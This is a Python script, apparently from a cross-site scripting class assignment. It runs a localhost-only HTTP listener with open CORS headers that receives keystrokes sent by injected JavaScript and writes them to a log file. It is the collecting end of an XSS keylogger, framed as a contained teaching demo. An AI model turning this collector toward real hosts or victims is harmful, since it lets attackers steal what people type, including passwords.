#!/usr/bin/env python3
"""
keylogger-demo/server.py — Local Contained JavaScript Keylogger Listener
Assignment 05 — Cross-Site Scripting (XSS)

Captures injected keystrokes over XMLHttpRequest/fetch and stores them in a local log.

STRICT ALLOWLIST ENFORCEMENT:
Listens strictly on 127.0.0.1:8002. Rejects any external hosts.
"""

import sys
import os
import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

BIND_HOST = "127.0.0.1"
BIND_PORT = 8002
LOG_FILE = os.path.join(os.path.dirname(__file__), "captured_keystrokes.log")

class KeyloggerHandler(BaseHTTPRequestHandler):
    def _send_cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self):
        self.send_response(200)
        self._send_cors()
        self.end_headers()

    def do_POST(self):
        client_ip = self.client_address[0]
        if client_ip not in ("127.0.0.1", "::1"):
            self.send_error(403, "Access restricted to localhost only.")
            return

        content_length = int(self.headers.get("Content-Length", 0))
        post_body = self.rfile.read(content_length).decode('utf-8', errors='replace')
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        log_line = f"[{timestamp}] IP: {client_ip} | Data: {post_body}\n"
        print(f"[KEYLOGGER] {log_line.strip()}")

        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_line)
        except Exception as e:
            print(f"[-] Logging error: {e}")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self._send_cors()
        self.end_headers()
        self.wfile.write(b'{"status":"recorded"}')

    def log_message(self, format, *args):
        pass

def main():
    print(f"[*] [CONTAINED DEMO] Local Keylogger Server running on http://{BIND_HOST}:{BIND_PORT}")
    print(f"[*] Capturing to: {LOG_FILE}")
    server = HTTPServer((BIND_HOST, BIND_PORT), KeyloggerHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Keylogger listener stopped.")
        server.server_close()

if __name__ == '__main__':
    main()

